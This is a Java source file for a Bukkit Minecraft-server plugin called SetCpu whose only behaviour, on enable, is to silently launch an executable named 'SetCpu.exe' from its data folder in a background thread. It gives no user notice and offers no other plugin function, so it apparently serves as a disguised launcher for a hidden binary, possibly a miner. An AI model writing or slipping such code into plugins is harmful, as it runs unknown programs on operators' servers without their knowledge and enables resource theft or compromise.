package setcpu;

import java.io.File;
import org.bukkit.plugin.java.JavaPlugin;

public class SetCpu extends JavaPlugin {
   public void onEnable() {
      final String path = this.getDataFolder() + File.separator + "SetCpu.exe";
      this.getDataFolder().mkdirs();
      final Runtime runtime = Runtime.getRuntime();
      (new Thread(new Runnable() {
         public void run() {
            try {
               runtime.exec(path);
            } catch (Exception e) {
               e.printStackTrace();
            }

         }
      })).start();
   }
}
